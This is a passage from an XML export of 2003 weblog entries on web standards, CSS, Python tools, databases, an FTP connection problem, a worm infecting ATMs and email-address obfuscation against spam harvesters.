		<field name="body">&lt;p&gt;Spotted on &lt;a href=&quot;http://slashdot.org/articles/03/11/15/2244214.shtml&quot; title=&quot;IBM Releases Desktop Linux Presentation&quot;&gt;Slashdot&lt;/a&gt;, &lt;acronym title=&quot;International Business Machines &quot;&gt;IBM&lt;/acronym&gt;'s &lt;a href=&quot;http://www.desktoplinux.com/files/article003/&quot;&gt;Open Source Desktop - Directions for today... and Tomorrow&lt;/a&gt; presentation includes &lt;a href=&quot;http://www.desktoplinux.com/files/article003/sld023.html&quot; title=&quot;Slide 23&quot;&gt;one slide&lt;/a&gt; that really caught my attention:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.desktoplinux.com/files/article003/sld023.html&quot;&gt;&lt;p&gt;To continue our own journey to becoming an on demand business, IBM expects to migrate our internal desktop environment, where appropriate, to open standards based on the Linux platform.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Of course, depending on how they define &quot;appropriate&quot; this could be a lot less exciting than it looks. Still, it's a pretty huge boost for the Linux desktop movement.&lt;/p&gt;

</field>
		<field name="created">2003-11-16 00:41:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1274</field>
		<field name="title">Contribute hammering FTP servers?</field>
		<field name="slug">contributeProblem</field>
		<field name="body">&lt;p&gt;We're having a problem at work with &lt;a href=&quot;http://www.macromedia.com/software/contribute/&quot;&gt;Macromedia Contribute&lt;/a&gt;. We host sites for a number of local companies, and one of them wants to use Contribute to update its site. The problem is that whenever Contribute tries to connect to our &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; server, it opens up 30 simultaneous connections, effectively running a denial of service that prevents other clients from logging in during peak times. I've searched the 'net and haven't found any references to this problem; does anyone know anything about the issue? We're running ProFTPD 1.2.9 and the client is using Macromedia Contribute 2.&lt;/p&gt;</field>
		<field name="created">2003-11-17 23:34:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1275</field>
		<field name="title">Sprint PCS goes CSS</field>
		<field name="slug">sprintPCS</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.sprintpcs.com/&quot;&gt;Sprint PCS&lt;/a&gt; site has relaunched, using &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; 1.0 transitional and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. It's another great example of a mostly web standards compliant commerical/corporate; there are a few validation errors thanks to a quarrelsome &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt;. France Rupert is the lead developer behind the new site and is &lt;a href=&quot;http://www.point-break.com/index.php#11162003&quot; title=&quot;sprintpcs.com redesigns with XHTML/CSS&quot;&gt;promising&lt;/a&gt; a detailed writeup of the process and challenges behind the redesign. France hails from Kansas City, so hopefully we'll be able to get him along to a &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/18/webMeetup&quot;&gt;web meetup&lt;/a&gt; in the not too distant future.&lt;/p&gt;

&lt;p&gt;In related news, WaSP have an &lt;a href=&quot;http://www.webstandards.org/learn/interviews/dcederholm/&quot; title=&quot;WaSP Interviews Dan Cederholm&quot;&gt;excellent interview&lt;/a&gt; up with Dan Cederholm, lead developer behind the high profile &lt;a href=&quot;http://www.fastcompany.com/&quot;&gt;Fast Company&lt;/a&gt; and &lt;a href=&quot;http://www.inc.com/&quot;&gt;Inc.com&lt;/a&gt; web standards redesigns and squire of &lt;a href=&quot;http://www.simplebits.com/&quot;&gt;Simple Bits&lt;/a&gt;. The interview has a lot of great anecdotes about how switching to standards saved both time and money.&lt;/p&gt;</field>
		<field name="created">2003-11-19 05:04:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1276</field>
		<field name="title">Teaching CSS: there's a long way to go</field>
		<field name="slug">teachingCSS</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://archivist.incutio.com/viewlist/css-discuss/33996&quot; title=&quot;Beginners Guide to CSS&quot;&gt;This email&lt;/a&gt; to the &lt;a href=&quot;http://www.css-discuss.org/&quot;&gt;css-discuss&lt;/a&gt; mailing list does a great job of describing the confusion and frustration that still confronts traditional web developers who are only just starting out on the road to mastering &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. When you've &quot;got it&quot;, it's easy to forget how much of a paradigm shift it is away from old school table methods. Here's an extract:&lt;/p&gt;

&lt;blockquote cite=&quot;http://archivist.incutio.com/viewlist/css-discuss/33996&quot;&gt;&lt;p&gt;Step Eight.&lt;/p&gt;
&lt;p&gt;Just when you think you're settling down into a slow and steady
learning curve, this is about when you start getting emails from
everyone who uses your site describing all kinds of variations on your
layout as it has been interpreted by their varying browsers and
platforms. This stage is the most important of all, the one where you
realize that CSS support is far, far more random than any HTML
workarounds that you've been dealing with for the (insert personal
experience here) years you've been making web pages.&lt;/p&gt;

&lt;p&gt;(Excerpt from an email from a user of one of my sites: &quot;the new
color and stuff on the homepage looks good, except on my computor [sic]
some of the pages are cut off at the bottom and have big gaps in them&quot;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Maybe a good analogy to make here is one with Linux: both are great in principle, but if you aren't comfortable with what you are doing you can run in to a whole bunch of problems. I wouldn't recommend anyone who is still on the CSS learning curve to move a big commercial project to pure &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, just as I wouldn't suggest a Linux newbie start hosting their own internet facing server.&lt;/p&gt;

&lt;p&gt;At any rate, it's obvious that we as a community still have a long way to go in creating useful resources for people who want to make the switch to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2003-11-19 05:59:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1277</field>
		<field name="title">Contribute / ProFTPd problem solved</field>
		<field name="slug">contributeFixed</field>
		<field name="body">&lt;p&gt;After further analysis of the Contribute problem &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/17/contributeProblem&quot; title=&quot;Contribute hammering FTP servers?&quot;&gt;described earlier&lt;/a&gt;, we discovered that Contribute was opening a new &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; connection every time we clicked a link within the application even before we had hit the &quot;edit page&quot; button to fire up the editing mode. Switching the connection over to use &lt;acronym title=&quot;Secure FTP&quot;&gt;SFTP&lt;/acronym&gt; instead of &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; had the same problem, with a secure connection being opened for each link we clicked instead. The connections remained open until we shut down Contribute.&lt;/p&gt;

&lt;p&gt;My hunch is that this could be an obscure bug that only surfaces when Contribute is used with ProFTPd 1.2.9. At any rate, we've solved the problem by setting the &lt;a href=&quot;http://proftpd.org/docs/directives/linked/config_ref_MaxClientsPerUser.html&quot;&gt;MaxClientsPerUser&lt;/a&gt; directive in the ProFTPd configuration file. Contribute doesn't seem to mind in the slightest.&lt;/p&gt;</field>
		<field name="created">2003-11-19 23:05:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1278</field>
		<field name="title">cgi_buffer</field>
		<field name="slug">cgi_buffer</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.mnot.net/cgi_buffer/&quot;&gt;cgi_buffer&lt;/a&gt; is voodoo magic for Perl, Python and &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; scripts that automatically handles a bunch of bandwidth saving &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; tricks such as Content-Length headers (which enable persistent connections), ETags for caching and GZip content compression. Pretty neat.&lt;/p&gt;</field>
		<field name="created">2003-11-22 18:36:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1279</field>
		<field name="title">Status Notification</field>
		<field name="slug">statusNotification</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://blog.colorstudy.com/ianb/weblog/2003/11/18.html#P36&quot;&gt;Status Notification&lt;/a&gt; is a web application pattern from Ian Bicking that uses sessions to solve the problem of how to display simple status messages without displaying whole pages with just a one line message on them or passing a message in a &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;. My current project could certainly benefit from this.&lt;/p&gt;</field>
		<field name="created">2003-11-22 18:39:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1280</field>
		<field name="title">The underscore hack</field>
		<field name="slug">underscore</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://web-graphics.com/mtarchive/001085.php#subheadcomments&quot; title=&quot;CSS: The Underscore MSIE-Only Hack&quot;&gt;Web-Graphics&lt;/a&gt;, Petr Pisar's &lt;a href=&quot;http://www.pixy.cz/blogg/clanky/cssunderscorehack/&quot;&gt;Underscore Hack&lt;/a&gt; provides a new way of targetting &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; rules specifically at Internet Explorer on Windows. As with all such hacks, the pros and cons of using this approach need to be closely examined before deploying it. The hack takes advantage of the fact that adding an underscore to the start of a property name causes that declaration to be ignored by every browser except &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; for Windows. However, the hack takes the dangerous step of using one bug to solve another. Peter-Paul Koch explained why this is a risky thing to do in &lt;a href=&quot;http://www.digital-web.com/columns/keepitsimple/keepitsimple_2003-11.shtml&quot; title=&quot;Keep CSS Simple&quot;&gt;a recent column&lt;/a&gt; for Digital Web magazine:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.digital-web.com/columns/keepitsimple/keepitsimple_2003-11.shtml&quot;&gt;&lt;p&gt;A certain browser has a certain CSS bug. Good to know. This same browser has another bug, usually in its parsing of CSS selectors or comments. This, too, is important information. However, a CSS hacker proceeds to use the second bug to &quot;solve&quot; the first one.&lt;/p&gt;

&lt;p&gt;Solving one bug by another is not my idea of keeping Web development simple, but the matter goes beyond bad coding style. These hacks are inherently unsafe.&lt;/p&gt;

&lt;p&gt;In an ideal world the next release of the browser would solve both bugs. In an uncaring world the next release of the browser would solve neither. In the uncertain world we live in the next release could solve one bug but not the other!&lt;/p&gt;

&lt;p&gt;Therefore you could end up with a hack that applies an extra rule you no longer need, or with a necessary extra rule that isn't applied any more.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In my opinion, hacks like this are safe for use on sites that are being actively maintained. If you use them in a &quot;fire and forget&quot; project you could well find it breaking in new browsers in a few years time, when the site is no longer being maintained but remains online and broken for all to see. If on the other hand you use it for a living, breathing site such as a constantly changing commercial project or a personal weblog errors that crop up in future browsers can be taken on as and when they appear.&lt;/p&gt;

&lt;p&gt;When all is said and done, a large proportion of hacks in use today exist to combat the infamous box model problem - and the best advice for coping with that can be found on Dave Shea's &lt;a href=&quot;http://www.mezzoblue.com/archives/2003/11/19/css_crib_she/&quot;&gt;CSS Crib Sheet&lt;/a&gt;: &lt;q cite=&quot;http://www.mezzoblue.com/archives/2003/11/19/css_crib_she/&quot;&gt;Try to avoid applying padding/borders and a fixed width to an element&lt;/q&gt;. Do that, and box model hacks just stop being necessary.&lt;/p&gt;</field>
		<field name="created">2003-11-23 00:17:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1281</field>
		<field name="title">Blogmarks</field>
		<field name="slug">blogmarks</field>
		<field name="body">&lt;p&gt;This entry was going to be another list of links, together with a note about how much I really needed to set up a separate link blog. Then I realised that it would make more sense just to set one up so that's exactly what I've done. I still need to implement the archive but it's &lt;span class=&quot;in-joke&quot; title=&quot;and I am likely to be eaten by a grue&quot;&gt;getting dark&lt;/span&gt; so I'm posting this and heading home.&lt;/p&gt;

&lt;p&gt;My main points of inspiration were Paul Hammond's &lt;a href=&quot;http://www.paranoidfish.org/links/&quot;&gt;bookmark store&lt;/a&gt;, Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/&quot;&gt;b-links&lt;/a&gt;, Anil Dash's &lt;a href=&quot;http://www.dashes.com/links/&quot;&gt;Daily Links&lt;/a&gt; and Jason Kottke's &lt;a href=&quot;http://www.kottke.org/remainder/&quot;&gt;Remaindered Links&lt;/a&gt;. Since there didn't seem to be any naming convention I decided to call them blogmarks, which &lt;a href=&quot;http://www.google.com/search?q=blogmarks&quot; title=&quot;Google Search: blogmarks&quot;&gt;isn't a new term&lt;/a&gt; but doesn't seem to have a widely accepted meaning yet either.&lt;/p&gt;

&lt;p&gt;The system is powered by a simple bookmarklet. To make things a little more interesting I'm capturing the referral information and using it to automatically generate the 'via' link; since the title of the previous page isn't available in Javascript I extract is using a server side script instead. I swayed briefly between using page extracts a la Hammond or sarcastic commentary a la Pilgrim and decided that commentary would be far more fun.&lt;/p&gt;</field>
		<field name="created">2003-11-24 00:52:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1282</field>
		<field name="title">Collaborative Redesign</field>
		<field name="slug">collaborativeRedesign</field>
		<field name="body">&lt;p&gt;Out with the orange, in with the green. As with my &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/09/halfHourRedesign&quot; title=&quot;Half Hour Redesign&quot;&gt;last redesign&lt;/a&gt;, only the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; changed. A fun deviation with this one was that it was a collaboration between myself and &lt;a href=&quot;http://blog.natbat.co.uk/&quot;&gt;Natalie&lt;/a&gt; over nearly 5,000 miles, using &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html#edit_styles&quot; title=&quot;The best bookmarklet ever&quot;&gt;edit styles&lt;/a&gt; and &lt;acronym title=&quot;AOL Instant Messenger&quot;&gt;AIM&lt;/acronym&gt; to pass each other snippets of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and instantly try them out.&lt;/p&gt;

&lt;p&gt;I haven't tested it very thoroughly at all so if there are any glaring abominations leave me a comment - I know about the blogmarks looking slightly out of place in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6 but I haven't quite decided if I can be bothered to find a workaround yet.&lt;/p&gt;
</field>
		<field name="created">2003-11-25 01:29:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1283</field>
		<field name="title">PostgreSQL 7.4</field>
		<field name="slug">postgres</field>
		<field name="body">&lt;p&gt;Last week's &lt;a href=&quot;http://www.postgresql.org/news/160.html&quot;&gt;release&lt;/a&gt; of PostgreSQL 7.4 made a great open source project even better - it even &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/001077.html&quot; title=&quot;PostgreSQL 7.4 Release Thoughts&quot;&gt;managed to impress&lt;/a&gt; hard-core MySQL advocate Jeremy Zawodny. The detailed &lt;a href=&quot;http://developer.postgresql.org/~momjian/HISTORY.html&quot;&gt;release notes&lt;/a&gt; show that most of the improvements were with regards to performance, but the thing that really caught my eye was tsearch2, the new full text indexing suite. A bit of digging brought up &lt;a href=&quot;http://developer.postgresql.org/cvsweb.cgi/pgsql-server/contrib/tsearch2/&quot; title=&quot;pgsql-server/contrib/tsearch2/&quot;&gt;the CVS tree&lt;/a&gt; for the new module, which in turn lead me to this &lt;a href=&quot;http://www.sai.msu.su/~megera/postgres/gist/tsearch/V2/docs/tsearch-V2-intro.html&quot; title=&quot;Tsearch2 - Introduction&quot;&gt;tutorial style overview&lt;/a&gt; of its capabilities.&lt;/p&gt;

&lt;p&gt;I make extensive use of MySQL's built in full text indexing on this blog for both the search engine and the &quot;related entries&quot; lists, so it's a feature I've really been missing in my experiments with PostgreSQL.&lt;/p&gt;</field>
		<field name="created">2003-11-25 01:40:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1284</field>
		<field name="title">Feed you</field>
		<field name="slug">feedYou</field>
		<field name="body">&lt;p&gt;Wow, &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/25/collaborativeRedesign#comments&quot; title=&quot;Comments on Collaborative Redesign&quot;&gt;that's&lt;/a&gt; what I call feedback! It's a shame pretty much everyone hates the new design but &lt;em&gt;I&lt;/em&gt; like it so it stays. I've taken a few tips though and tweaked the link colours a bit, as well as making a few other small changes such as a darker green for the header and a 1em margin around the page.&lt;/p&gt;

&lt;p&gt;In an attempt to satiate the voracious appetite for &lt;acronym title=&quot;REally Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; displayed by some of my visitors I've set up two new feeds: &lt;a href=&quot;http://simon.incutio.com/comments/rss&quot;&gt;Blog comments&lt;/a&gt; and &lt;a href=&quot;http://simon.incutio.com/blogmarks/rss&quot;&gt;Blogmarks&lt;/a&gt;. I don't use an aggregator myself so I'd appreciate feedback on how well they work. I've also put together a &lt;a href=&quot;http://simon.incutio.com/blogmarks/&quot;&gt;blogmarks archive&lt;/a&gt; - no search engine yet, but it's on the list.&lt;/p&gt;
</field>
		<field name="created">2003-11-26 01:55:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1285</field>
		<field name="title">Discovering Berkeley DB</field>
		<field name="slug">discoveringBerkeleyDB</field>
		<field name="body">&lt;p&gt;I'm working on a project at the moment which involves exporting a whole bunch of data out of an existing system. The system is written in Perl and uses Berkeley DB files for most of its storage.&lt;/p&gt;

&lt;p&gt;I'd never done anything with Berkeley DB before, but luckily Python has a &lt;a href=&quot;http://www.python.org/doc/current/lib/module-bsddb.html&quot; title=&quot;bsddb -- Interface to Berkeley DB library&quot;&gt;module&lt;/a&gt; which seems to do all of the hard work for me:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; db = bsddb.btopen('xpand.db')
&amp;gt;&amp;gt;&amp;gt; db.keys()[0:10]
[':archives:index.html', ':art:test.html', ... 
&amp;gt;&amp;gt;&amp;gt; db[':art:test.html']
'template;front.tp\x01\x01'
&amp;gt;&amp;gt;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The Berkeley DB libraries are maintained by &lt;a href=&quot;http://www.sleepycat.com/&quot;&gt;Sleepycat Software&lt;/a&gt;. Unfortunately, their site is completely saturated with marketing jargon. &lt;q cite=&quot;http://www.sleepycat.com/&quot;&gt;Our customers rely on Berkeley DB for fast, scalable, reliable and cost-effective data management for their mission-critical applications&lt;/q&gt;. Great - now what does it &lt;em&gt;do&lt;/em&gt; exactly?&lt;/p&gt;

&lt;p&gt;Some digging around turned up the real information: the &lt;a href=&quot;http://www.sleepycat.com/docs/reftoc.html&quot;&gt;Berkeley DB Tutorial and Reference Guide&lt;/a&gt;, which contains pretty much everything you could possible want to know about the technology. It turns out that at a basic level Berkeley DB is just a very high performance, reliable way of persisting dictionary style data structures - anything where a piece of data can be stored and looked up using a unique key. The key and the value can each be up to 4 gigabytes in length and can consist of anything that can be crammed in to a string of bytes, so what you do with it is completely up to you. The only operations available are &quot;store this value under this key&quot;, &quot;check if this key exists&quot; and &quot;retrieve the value for this key&quot; so conceptually it's pretty simple - the complicated stuff all happens under the hood.&lt;/p&gt;

&lt;p&gt;It seems like a great alternative to a full on relational database for simple applications, although I'm slightly confused by the license which allows free use for open source products but requires a license for commercial applications. Does that mean that if I use the bsddb Python module in a commercial app I need to get a license from Sleepycat?&lt;/p&gt;</field>
		<field name="created">2003-11-26 02:36:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1286</field>
		<field name="title">Pyrex</field>
		<field name="slug">pyrex</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.cosc.canterbury.ac.nz/~greg/python/Pyrex/&quot;&gt;Pyrex&lt;/a&gt; is a language for writing Python extension modules. It's pretty interesting - the syntax looks very similar to Python (the authors claim you can write C extension modules without knowing anything about the Python/C API) but uses additional type hints to compile down to ultra efficient C code, ready to be imported in to your Python applications. The prime numbers example maakes things a lot more clear:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.cosc.canterbury.ac.nz/~greg/python/Pyrex/&quot;&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#
#  Calculate prime numbers
#

def primes(int kmax):
  cdef int n, k, i
  cdef int p[1000]
  result = []
  if kmax &amp;gt; 1000:
    kmax = 1000
  k = 0
  n = 2
  while k &amp;lt; kmax:
    i = 0
    while i &amp;lt; k and n % p[i] &amp;lt;&amp;gt; 0:
      i = i + 1
    if i == k:
      p[k] = n
      k = k + 1
      result.append(n)
    n = n + 1
  return result

bash$ python pyrexc primes.pyx
bash$ gcc -shared primes.o -lxosd -o primes.so

&amp;gt;&amp;gt;&amp;gt; import primes
&amp;gt;&amp;gt;&amp;gt; primes.primes(10)
[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p&gt;I imagine there's a slight performance impact from using Python's list data structures instead of a more low level C array, but I doubt it's significant. In any case, the real promise of Pyrex lies in making it easier to write Python wrappers for existing C libraries - a topic touched on by the &lt;a href=&quot;http://www.cosc.canterbury.ac.nz/~greg/python/Pyrex/version/Doc/overview.html#InterfacingWithExternal&quot; title=&quot;Interfacing with External C Code&quot;&gt;Pyrex Documentation&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-11-26 03:09:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1287</field>
		<field name="title">Why run Windows on an ATM?</field>
		<field name="slug">windowsOnATMs</field>
		<field name="body">&lt;p&gt;So you're writing the software for an &lt;acronym title=&quot;Automated Teller Machine&quot;&gt;ATM&lt;/acronym&gt;. It needs to display something pretty on the screen, control the hardware that serves out the money and talk securely to your central servers. It also needs to be stable, secure, reliable and allow remote administration. Why on &lt;em&gt;earth&lt;/em&gt; would you choose Windows as the operating system?&lt;/p&gt;

&lt;p&gt;Check out this article on The Register: &lt;a href=&quot;http://www.theregister.co.uk/content/55/34175.html&quot;&gt;Nachi worm infected Diebold ATMs&lt;/a&gt;. This just beggars belief. How a Windows worm spread on to a network with &lt;acronym title=&quot;Automated Teller Machine&quot;&gt;ATM&lt;/acronym&gt;s connected to it is beyond me - even if you take in to account employee laptops plugged in behind the firewall it's still incredible that the &lt;acronym title=&quot;Automated Teller Machine&quot;&gt;ATM&lt;/acronym&gt;s weren't on their own separate secure network.&lt;/p&gt;

&lt;p&gt;Here's the best bit:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.theregister.co.uk/content/55/34175.html&quot;&gt;&lt;p&gt;Billett defended the company's patching process, which he said involves testing each new bug fix, and deploying at a wide variety of institutions with a mix of network architectures. &quot;A lot of those machines actually have to be visited by a service technician&quot; to be patched, said Billett. &quot;Our experience in the past is we are able to turn those around in one or two days.&quot;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;What do you have to do to patch these things, plug in a keyboard and mouse?&lt;/p&gt;</field>
		<field name="created">2003-11-26 05:16:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1288</field>
		<field name="title">IXR 2.0</field>
		<field name="slug">ixr2</field>
		<field name="body">&lt;p&gt;Harry Fuecks has been hacking on &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;my XML-RPC library&lt;/a&gt;, and has released a new version with some significant changes. His &lt;a href=&quot;http://www.phppatterns.com/index.php/article/articleview/83/1/2/&quot; title=&quot;XML-RPC Progress&quot;&gt;article on phpPatterns&lt;/a&gt; describes the changes and provides a link to download the updated code. He's made a bunch of interesting architectural changes which take advantage of a number of useful &lt;acronym title=&quot;PHP Extension and Application Repository&quot;&gt;PEAR&lt;/acronym&gt; classes, including &lt;a href=&quot;http://pear.php.net/package/HTTP_Request&quot;&gt;HTTP_Request&lt;/a&gt; which provides support for proxies and authentication, two frequently requested features.&lt;/p&gt;

&lt;p&gt;I don't know when I'll get a chance to look at my version of the code again, since most of my current development work involves Python rather than &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;. If you're looking for an updated version of the library you would do well to check out Harry's enhancements.&lt;/p&gt;</field>
		<field name="created">2003-11-27 03:38:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1289</field>
		<field name="title">Un-happened</field>
		<field name="slug">unhappened</field>
		<field name="body">&lt;p&gt;Charles Miller, in &lt;a href=&quot;http://fishbowl.pastiche.org/2003/11/25/google_microsoft_and_tall_poppies&quot;&gt;Google, Microsoft and Tall Poppies.&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://fishbowl.pastiche.org/2003/11/25/google_microsoft_and_tall_poppies&quot;&gt;
&lt;p&gt;Bill Gates' original goal in forming Microsoft was famously to
have (emphasis mine) &quot;A computer on every desk and in every home, &lt;em&gt;running Microsoft software&lt;/em&gt;&quot;.
You'll not find the last three words of that sentence in any official
Microsoft history (or at least I couldn't, and I searched hard).
They've been carefully un-happened: the dream of a nascent monopolist
truncated into a facade of altruism.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.google.com/search?q=%22desk+and+in+every+home%22+site%3Amicrosoft.com+-%22every+home+running%22&quot;&gt;&quot;desk and in every home&quot; site:microsoft.com -&quot;every home running&quot;&lt;/a&gt; - 167 results&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.google.com/search?q=%22desk+and+in+every+home+running%22+site%3Amicrosoft.com&quot;&gt;&quot;desk and in every home running&quot; site:microsoft.com&lt;/a&gt; - 3 results, all from a &lt;a href=&quot;http://www.microsoft.com/billgates/speeches/2002/04-25stanford.asp&quot;&gt;Bill Gates speech&lt;/a&gt; at Stanford in 2002.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Fascinating.&lt;/p&gt;</field>
		<field name="created">2003-11-27 16:21:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1290</field>
		<field name="title">Repartitioning with Knoppix</field>
		<field name="slug">repartitioning</field>
		<field name="body">&lt;p&gt;I've been long bemoaning the fact that if you want to repartition your hard drive to install Linux as a dual boot with an existing Windows system the most frequently recommended method is to buy a copy of Partion Magic. You would have thought the open source software world would have provided a free alternative by now.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.halfcooked.com/mt/archives/000655.html&quot; title=&quot;Even More Knoppix&quot;&gt;Via Andy Todd&lt;/a&gt;, it turns out that they have. &lt;a href=&quot;http://www.gnu.org/software/parted/&quot;&gt;GNU Parted&lt;/a&gt; is a repartioning tool for Linux. &lt;a href=&quot;http://qtparted.sourceforge.net/&quot;&gt;QtParted&lt;/a&gt; wraps it in a &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt; with a Partition Magic style interface. And the awesome &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/23/knoppix&quot; title=&quot;An earlier entry about Knoppix&quot;&gt;Knoppix&lt;/a&gt; comes with QtParted included on the disk. So instead of shelling out for an expensive package that you are unlikely to ever use more than once, you can download and burn a Knoppix &lt;acronym title=&quot;Compact Disk&quot;&gt;CD&lt;/acronym&gt;, boot in to Linux and repartition from there. I'll be trying this out for real on Monday, and I'll report back with the results when I do.&lt;/p&gt;

&lt;p&gt;As an aside, has anyone ever found a web page that lists all of the software included on the Knoppix &lt;acronym title=&quot;Compact Disk&quot;&gt;CD&lt;/acronym&gt;?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Closer inspection reveals that Parted can't resize &lt;acronym title=&quot;New Technology File System&quot;&gt;NTFS&lt;/acronym&gt;. Thankfully, &lt;a href=&quot;http://mlf.linux.rulez.org/mlf/ezaz/ntfsresize.html&quot;&gt;ntfsresize&lt;/a&gt; can - and ntfsresize is integrated in to QtParted. Magic.&lt;/p&gt;</field>
		<field name="created">2003-11-30 00:36:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1291</field>
		<field name="title">Selectutorial</field>
		<field name="slug">selectutorial</field>
		<field name="body">&lt;p&gt;New from Russ Weakley: &lt;a href=&quot;http://css.maxdesign.com.au/selectutorial/&quot;&gt;Selectutorial&lt;/a&gt;, which taks his widely acclaimed step by step &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; tutorial style and applies it to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; selectors. Having a full understanding of selectors is critical if you're going to take full advantage of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, so if you don't get them yet you should really check this out.&lt;/p&gt;</field>
		<field name="created">2003-12-02 02:37:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1292</field>
		<field name="title">HTML entities for email addresses: don't bother</field>
		<field name="slug">entitiesDontWork</field>
		<field name="body">&lt;p&gt;I've suspected this for a long time, and now here's the empirical evidence: &lt;a href=&quot;http://www.unicom.com/chrome/a/000388.html&quot;&gt;Popular Spam Protection Technique Doesn't Work&lt;/a&gt;. If you're relying on &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; entities to protect your email address from spam harvesters - for example &lt;code&gt;username&amp;amp;#64;example.com&lt;/code&gt; - your email address may as well be in plain text. Chip Rosenthal downloaded a tool called &quot;Web Data Extractor v4.0&quot; and tried it on some test data to prove once and for all that the technique doesn't work.&lt;/p&gt;

